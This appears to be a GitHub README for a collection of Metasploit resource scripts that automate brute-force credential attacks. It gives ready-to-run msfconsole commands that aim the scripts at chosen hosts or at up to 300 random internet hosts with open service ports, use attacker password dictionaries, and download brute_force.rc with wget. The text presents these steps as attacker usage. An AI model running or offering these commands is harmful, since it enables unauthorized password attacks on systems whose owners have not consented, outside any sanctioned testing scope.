## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provides an easy way for us to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts, they contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands or by directly embedding Ruby to do things like call APIs, interact with objects in the database, modules and iterate actions.</blockquote>

**This repository contains various resource files to assiste in exploitation or metasploit database related issues.**<br />
![pic](http://i68.tinypic.com/21ovkfm.jpg)

#### [!] Please read the article about resource scripting [here](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

<br /><br /><br />

### USING 'SETG' GLOBAL VARIABLES TO CONFIG RC SCRIPTS

![pic](http://i67.tinypic.com/2wfi88h.png)
Brute force rc scripts requires the msf database to be empty of hosts and services data. Thats the main reason why the scripts creates a new workspace named **'redteam'** and stores all the data inside that workspace. At exit the rc script it will delete redteam workspace/data to be abble to accept new data inputs.

Many of the this brute force resource scripts are written to accept **user inputs** (setg global variables).<br />This means that users can run this kind of resource scripts in 3 diferent ways:

Execute resource script

      msfconsole -r /root/mysql_brute.rc

Instruct the resource script to scan rhosts input by attacker

      msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;resource /root/mysql_brute.rc'

Instruct the resource script to search in WAN for rhosts with service port open

      msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/mysql_brute.rc'

<br /><br /><br />

**Adicionally to the described settings, we can also combine diferent configurations at runtime execution.**<br />

---

Instruct the resource script to search in WAN for rhosts with service port open and limmit the search to 300 rhosts

      msfconsole -q -x 'setg RANDOM_HOSTS true;setg LIMMIT 300;resource /root/mysql_brute.rc'

Instruct the resource script to use attackers dicionary file (absoluct path required)

      msfconsole -q -x 'setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'

Instruct the resource script to scan rhosts input by attacker, and use the attacker dicionary file 

      msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'

<br /><br /><br />

#### Step-By-Step how to run brute_force.rc script

1º download resource script to **/root** folder<br />

      sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/brute_force.rc

2º start postgresql service (**local**)<br />

      sudo service postgresql start

3º run brute_force.rc resource script to search hosts on WAN (**limmit to 300 searchs**)<br />

      sudo msfconsole -q -x 'setg RANDOM_HOSTS true;setg LIMMIT 300;resource /root/brute_force.rc'


Brute force rc scripts requires the msf database to be empty of hosts and services data. Thats the main reason why the scripts creates a new workspace named **'redteam'** and stores all the data inside that workspace. At exit the rc script it will delete redteam workspace/data to be abble to accept new data inputs.

Instruct rc scripts to export **redteam** workspace database to a local file **/root/database_gfvte.xml**

      sudo msfconsole -q -x 'setg SAVE_DB true;resource /root/brute_force.rc'

### Suspicious Shell Activity RedTeam @2019

<br />

